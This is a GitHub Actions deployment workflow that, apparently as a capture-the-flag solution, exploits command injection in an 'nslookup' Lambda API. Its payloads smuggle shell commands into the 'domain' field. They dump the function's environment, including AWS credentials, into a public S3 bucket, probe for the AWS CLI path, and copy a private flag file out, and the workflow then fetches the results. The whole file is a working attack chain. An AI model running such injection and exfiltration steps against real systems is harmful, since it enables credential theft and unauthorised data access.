name: deploy
on:
  push:
    branches:
      - corgi

jobs:
  aws:
    runs-on: ubuntu-latest
    permissions:
      id-token: write
      contents: read
    steps:
      - name: Get AWS credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::009661764077:role/cicdRole
          aws-region: us-east-1

      - name: AWS identity
        run: aws sts get-caller-identity

      - name: Step 1 - Verify lambda is invoked and find aws CLI path
        run: |
          echo "===== TEST: write env output to public bucket ====="
          # If this appears in platform-bucket, lambda IS being invoked (not MOCK)
          # and we learn: PATH, AWS credentials available to lambdaRole, aws CLI location
          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d '{"domain":"x; env | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_dump.txt 2>&1 | aws s3 cp - s3://platform-bucket-009661764077-us-east-1/env_err.txt"}'

      - name: Step 2 - Also try explicit aws paths in case not in PATH
        run: |
          echo "===== TEST: try known aws CLI paths ====="
          for AWS_PATH in "aws" "/opt/bin/aws" "/opt/aws/bin/aws" "/var/lang/bin/aws"; do
            curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
              -H "Content-Type: application/json" \
              -d "{\"domain\":\"x; echo $AWS_PATH > /tmp/p.txt && $AWS_PATH s3 cp /tmp/p.txt s3://platform-bucket-009661764077-us-east-1/awspath_${AWS_PATH//\//_}.txt\"}"
            sleep 1
          done

      - name: Wait for lambda executions to complete
        run: sleep 15

      - name: Step 3 - Check what appeared in public bucket
        run: |
          echo "===== CHECK: env dump ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_dump.txt"
          echo ""
          echo "===== CHECK: error output ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/env_err.txt"
          echo ""
          echo "===== CHECK: which aws path worked ====="
          for AWS_PATH in "aws" "opt_bin_aws" "opt_aws_bin_aws" "var_lang_bin_aws"; do
            echo "--- $AWS_PATH ---"
            curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/awspath_${AWS_PATH}.txt"
          done

      - name: Step 4 - If tests passed, grab the actual flag
        run: |
          echo "===== FINAL: copy flag to public bucket ====="
          curl -s -X POST "https://3q931syi7b.execute-api.us-east-1.amazonaws.com/dev/nslookup" \
            -H "Content-Type: application/json" \
            -d '{"domain":"x; aws s3 cp s3://codec4f26c862a321ef5/flag.txt s3://platform-bucket-009661764077-us-east-1/flag_exfil.txt"}'
          sleep 10
          echo "===== FLAG ====="
          curl -s "https://platform-bucket-009661764077-us-east-1.s3.amazonaws.com/flag_exfil.txt"
